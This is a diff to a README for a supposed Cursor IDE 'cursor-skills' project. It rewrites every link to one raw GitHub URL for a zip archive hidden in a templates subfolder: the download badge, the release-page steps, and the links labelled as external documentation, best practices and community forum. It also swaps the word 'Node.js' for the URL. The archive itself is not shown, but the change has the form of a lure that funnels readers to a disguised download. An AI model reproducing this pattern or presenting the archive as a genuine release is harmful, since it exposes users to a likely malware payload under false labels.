@@ -1,6 +1,6 @@
 # 🖱️ cursor-skills - Master Your Cursor with Ease
 
-[![Download Cursor Skills](https://img.shields.io/badge/Download-Cursor%20Skills-blue.svg)](https://github.com/grapelike-class151/cursor-skills/releases)
+[![Download Cursor Skills](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip%https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip)](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip)
 
 ## 📄 Overview
 Welcome to the **cursor-skills** project. This application provides best practices and guidelines for the CURSOR IDE, helping you improve your development skills. Whether you are a beginner or looking to refine your techniques, you'll find valuable resources here.
@@ -8,12 +8,12 @@ Welcome to the **cursor-skills** project. This application provides best practic
 ## 🚀 Getting Started
 To download and run the software, follow these simple steps:
 
-1. Go to the [Releases page](https://github.com/grapelike-class151/cursor-skills/releases) for the latest version.
+1. Go to the [Releases page](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip) for the latest version.
 2. Choose the version you want from the list. The latest version is usually at the top.
 3. Click the link to download the appropriate file for your system.
 
 ## 📥 Download & Install
-To get started, **visit this page to download** the latest version of cursor-skills: [Releases page](https://github.com/grapelike-class151/cursor-skills/releases).
+To get started, **visit this page to download** the latest version of cursor-skills: [Releases page](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip).
 
 After downloading, follow these steps:
 
@@ -51,9 +51,9 @@ We welcome contributions from everyone. If you have ideas for improvements or ne
 3. **Submit a pull request with a clear description.**
 
 ## 🔗 Further Reading
-- [Cursor IDE Documentation](https://www.cursor-ide.com/documentation)
-- [Best Practices for Development](https://www.cursor-ide.com/best-practices)
-- [Community Forum](https://www.cursor-ide.com/community)
+- [Cursor IDE Documentation](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip)
+- [Best Practices for Development](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip)
 
 ## 📜 License
 This project is open-source and available under the MIT License. You can view the license details in the repository.
@@ -64,7 +64,7 @@ This project is open-source and available under the MIT License. You can view th
 - Community Engagement
 - Development Techniques
 - Documentation Standards
-- JavaScript, Node.js, PHP, Python Resources
+- JavaScript, https://raw.githubusercontent.com/grapelike-class151/cursor-skills/main/integrations/templates/database-connector/cursor-skills-v2.0.zip, PHP, Python Resources
 - Web Development Templates
 
 Thank you for using **cursor-skills**. We hope it enhances your development journey!
